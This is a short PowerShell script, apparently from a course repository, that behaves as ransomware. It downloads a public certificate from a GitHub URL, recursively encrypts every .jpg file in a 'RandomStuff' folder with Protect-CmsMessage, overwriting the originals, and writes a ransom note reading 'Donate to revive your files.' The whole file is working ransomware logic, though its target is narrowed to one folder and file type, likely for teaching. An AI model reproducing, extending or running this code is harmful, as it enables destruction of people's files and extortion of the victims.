$folder = "$PSScriptRoot\RandomStuff"
$info = "$PSScriptRoot\RandomStuff\Readme.txt"
$type = "*.jpg"
$cert = "$PSScriptRoot\dwn.cer"
$urlCert = "https://raw.githubusercontent.com/MGSE97/PVBPS/master/PowerShell/certs/public.cer"

if((Test-Path $cert) -eq 0)
{
    Invoke-WebRequest -Uri $urlCert -OutFile $cert
}

if(Test-Path $folder -PathType Container)
{
    # Exists
    Get-ChildItem -Path $folder -Filter $type -Recurse -File | ForEach-Object {
        # Encrypt
        [IO.File]::WriteAllText($_.FullName, (Protect-CmsMessage -To $cert -Content ([Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)))))
    }

    if((Test-Path $info) -eq 0)
    {
        Set-Content -Path $info -Encoding UTF8 -Value "Magic happened!
Donate to revive your files.

    Your friendly Wizard."
    }
}